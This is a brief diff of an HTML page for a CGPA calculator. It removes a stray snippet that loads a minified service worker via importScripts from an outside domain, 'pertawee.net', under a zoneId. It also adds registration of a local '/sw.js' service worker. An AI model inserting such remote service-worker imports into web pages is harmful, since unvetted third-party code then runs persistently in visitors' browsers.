@@ -109,12 +109,7 @@
       }
     }
   </style>
-  self.options = {
-    "domain": "pertawee.net",
-    "zoneId": 9973950
-}
-self.lary = ""
-importScripts('https://pertawee.net/act/files/service-worker.min.js?r=sw')
+
 </head>
 <body>
   <div class="hero">
@@ -162,6 +157,12 @@ importScripts('https://pertawee.net/act/files/service-worker.min.js?r=sw')
   </div>
 
   <script>
+    if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js')
+    .then(() => console.log('Service Worker registered successfully'))
+    .catch(err => console.error('Service Worker registration failed:', err));
+}
+
     function calculateCGPA() {
       const s = parseInt(document.getElementById('s').value) || 0;
       const a = parseInt(document.getElementById('a').value) || 0;
